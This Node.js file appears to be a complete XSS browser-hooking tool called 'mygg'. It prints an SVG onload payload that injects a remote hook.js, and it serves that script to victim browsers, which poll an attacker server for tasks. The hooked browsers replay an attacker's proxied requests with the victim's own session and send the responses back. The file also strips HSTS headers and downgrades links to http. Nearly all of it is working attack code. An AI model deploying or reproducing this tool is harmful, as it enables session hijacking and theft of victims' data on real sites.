/* Config */
const config = {
    // Change web_domain to your domain.
    web_domain: 'example.com',           
    web_interface: '0.0.0.0',
    web_port: 443,
    web_protocol: 'https',
    polling_time: 2000,
    key: './server.key',
    cert: './server.crt',
    // Either set proxy_interface to 127.0.0.1 and use ssh+portforwarding (if mygg.js runs remote)
    // or bind it to 0.0.0.0 and put your remote addr in proxy_allowed_ips.
    proxy_interface: '127.0.0.1',
    proxy_port: 8081,
    proxy_allowed_ips: ['127.0.0.1'],
}

const web = require(config.web_protocol);
const proxy = require('http');
const fs = require('fs');

/* 
task_pending structure:
[{"id":2,"method":"POST","url":"/secret.html","head":{"Content-Type":"application/json"},"body":'{"test":"asdf"}'}]
*/

var tasks_pending = [];
var task_callbacks = {};

/* The HTTP proxy server that communicates with mygg */

var task_counter = 0;

proxy.createServer(function (req, res) {
    /* Checks if the client is allowed */
    var client_ipaddr = req.connection.remoteAddress;
    if (config.proxy_allowed_ips.indexOf(client_ipaddr) === -1) {
        console.log(`[+] Denied client ${client_ipaddr} to connect to proxy`);
        res.writeHead(403);
        res.end();
        return;
    }

    var url = new URL(req.url);
    var path = url.pathname + "?" + url.searchString;

    console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
    console.log("[+] Requesting: " + path)
	
    /* Check if request from proxy contains a body */
    if (req.headers['content-length'] > 0 || req.headers['Content-Length'] > 0) {
        var body = '';
        req.on('data', function (chunk) {
            body += chunk;
        });
        req.on('end', function () {
            body_encoded = Buffer.from(body).toString('base64');
            var new_task = {"id": task_counter++, "method": req.method, "url": path, "head": req.headers, "body": body_encoded}
            tasks_pending.push(new_task);
            task_callbacks[new_task.id] = function (result) {
                var body_decoded = Buffer.from(result.body, 'base64').toString();
                var body_fixed = stripHooks(body_decoded);
                var body_fixed = https2http(body_fixed);

                var headers_decoded = Buffer.from(result.headers, 'base64');
                var headers_fixed = str2json(headers_decoded);
                var headers_fixed = stripHeaders(headers_fixed);
                var headers_fixed = fixContentLength(headers_fixed, body_fixed.length);

                console.log("[+] Received status: " + result.status);
                console.log("[+] Received headers:\n"); console.log(headers_fixed);
                console.log("[+] Received body:\n" + body_fixed);
                console.log("###############################################################");

                res.writeHead(result.status, headers_fixed);
                res.end(body_fixed);
            };
        });
	} else {
        var new_task = {"id": task_counter++, "method": req.method, "url": path, "head": req.headers, "body": null}
        tasks_pending.push(new_task);
        task_callbacks[new_task.id] = function (result) {
            var body_decoded = Buffer.from(result.body, 'base64').toString();
            var body_fixed = stripHooks(body_decoded);
            var body_fixed = https2http(body_fixed);

            var headers_decoded = Buffer.from(result.headers, 'base64');
            var headers_fixed = str2json(headers_decoded);
            var headers_fixed = stripHeaders(headers_fixed);
            var headers_fixed = fixContentLength(headers_fixed, body_fixed.length);

            console.log("[+] Received status: " + result.status);
            console.log("[+] Received headers:\n"); console.log(headers_fixed);
            console.log("[+] Received body:\n" + body_fixed);
            console.log("###############################################################");

            res.writeHead(result.status, headers_fixed);
            res.end(body_fixed);
        };
    }


}).listen(config.proxy_port, config.proxy_interface, function (err) {
    if (err) return console.error(err)
    var info = this.address()
    console.log(`[+] Proxy server is listening on address ${info.address} port ${info.port}`)
});


/* 
The web server communicating with the hooked browser.
Used for serving hook.js, polling and receving requests.
*/

const https_options = {
    key: fs.readFileSync(config.key),
    cert: fs.readFileSync(config.cert)
};
web.createServer(https_options, function (req, res) {
    var ipaddr = req.connection.remoteAddress;
    var useragent = req.headers['user-agent'];
    var referer = req.headers['referer'];
    /* Serves the hook file */
    if (req.url == '/hook.js') {
        res.writeHead(200, {"Content-Type": "application/javascript"});
        res.end(hook_file);
        console.log("[+] Hooked new browser [" + ipaddr + "][" + useragent + '][' + referer + ']');
    /* Hooked browser asks mygg if there are any new jobs for it */
    } else if (req.url == '/polling') {
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', '*')
        res.setHeader('Content-Type', 'application/json')
        if (tasks_pending.length > 0) {
            data = JSON.stringify(tasks_pending);
            res.writeHead(200);
            res.end(data);
            tasks_pending = []
        } else {
            res.writeHead(404)
            res.end();
        }
    /* Catching the pre-flight request from the hooked browser */
    } else if (req.url == '/responses' && req.method == 'OPTIONS') {
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        res.writeHead(200);
        res.end();
    /* Catching the responses */
    } else if (req.url == '/responses' && req.method == 'POST') {
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        res.setHeader('Content-Type', 'application/json')

        var body = '';
        req.on('data', function (chunk) {
            body += chunk;
        });
        req.on('end', function () {
            var result = JSON.parse(body);
            var handler = task_callbacks[result.id];
            handler(result);
            res.writeHead(200);
            res.end();
        });

    } else {
        res.writeHead(404);
        res.end();
    }
}).listen(config.web_port, config.web_interface, function (err) {
    if (err) return console.error(err)
    var info = this.address()
    console.log(`[+] Web server is listening on address ${info.address} port ${info.port}`)
});

/* Converts each key in JSON to lower case */
function convertJSONlower(_json) {
    var asdf = _json;
    asdf.replace(/"([^"]+)":/g, function($0,$1) {
        return ('"' + $1.toLowerCase() + '":');
    });
    return asdf;
}

/* Removes HSTS header */
function stripHeaders(headers) {
    delete headers['strict-transport-security'];
    delete headers['content-encoding'];
    delete headers['content-length'];
    return headers;
}

/* Strips complete URLs with hook.js to "javascript", which will be ignored */
function stripHooks(body) {
    return body.replace(/https?:\/\/.*?\/hook\.js/g, 'javascript:');
}

/* Convert links in the body from https to http */
function https2http(body) {
    return body.toString().replace(/https\:\/\//g, "http://");
}

/* Sets the content-length header */
function fixContentLength(headers, new_length) {
    headers['Content-Length'] = new_length;
    return headers;
}

/* Convert raw headers to JSON with lowercase keys */
function str2json(input) {
    var input = input.toString().trim();
    var x = input.split("\r\n");
    var buf = '{';
    for (var i = 0; i < x.length; i++) {
        var y = x[i].split(': ');
        var key = y[0].replace(':', '').replace('"', '').toLowerCase();
        var val = y[1].replace(/\"/g, '');
        buf = buf + '"' + key + '": "' + val + '"';
        if (i != x.length-1) buf = buf + ', ';
    }
    buf = buf + '}';
    return JSON.parse(buf);
}

/* The payload that downloads mygg */
var hook = '<svg/onload="x=document.createElement(\'script\');'
var hook = hook + 'x.src="//' + config.web_domain + '/hook.js";document.head.appendChild(x);">'
console.log("[+] Payload:\r\n" + hook + "\r\n")

var hook_file = `
function makeRequest(id, method, url, head, body) {
    var target_http = new XMLHttpRequest();
    target_http.onreadystatechange = function() {       
        if (target_http.readyState == 4) {
            var mygg_http = new XMLHttpRequest();
            mygg_http.open("POST", "//${config.web_domain}:${config.web_port}/responses", true);
            mygg_http.setRequestHeader("Content-Type", "application/json");
            var resp_status = target_http.status;
            var resp_body = btoa(target_http.responseText);
            var resp_headers = btoa(target_http.getAllResponseHeaders());
            // Checking if the browser got a redirect
            if (url == getPath(target_http.responseURL)) {
                var obj = {"id": id.toString(), "url": url, "status": resp_status, "headers": resp_headers, "body": resp_body}
            } else {
                // Need to redirect the attacking browser too
                var redirect = btoa("Location: " + target_http.responseURL);
                var obj = {"id": id.toString(), "url": url, "status": 301, "headers": redirect, "body": ''}
            }
            mygg_http.send(JSON.stringify(obj));
        }
    };
    target_http.open(method, url, true);
    //for (var key in head) {
     //   target_http.setRequestHeader(key, head[key]) 
    //}
    if (body) {
        target_http.send(atob(body));
    } else {
        target_http.send();
    }
}
function getPath(url) {
    return '/' + url.split('/').splice(3).join('/');
}
function poll() {
    var mygg_http = new XMLHttpRequest();
    mygg_http.onreadystatechange = function () {
        if (mygg_http.readyState == 4 && mygg_http.status == 200) {
            console.log("FROM POLLING:")
            console.log(mygg_http.responseText)
            var tasks = JSON.parse(mygg_http.responseText);
            for (var i in tasks){
                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
            }
        }
    };
    mygg_http.open("GET", "//${config.web_domain}:${config.web_port}/polling", true);
    mygg_http.send();
    setTimeout(poll, ${config.polling_time});
}
poll();
`;

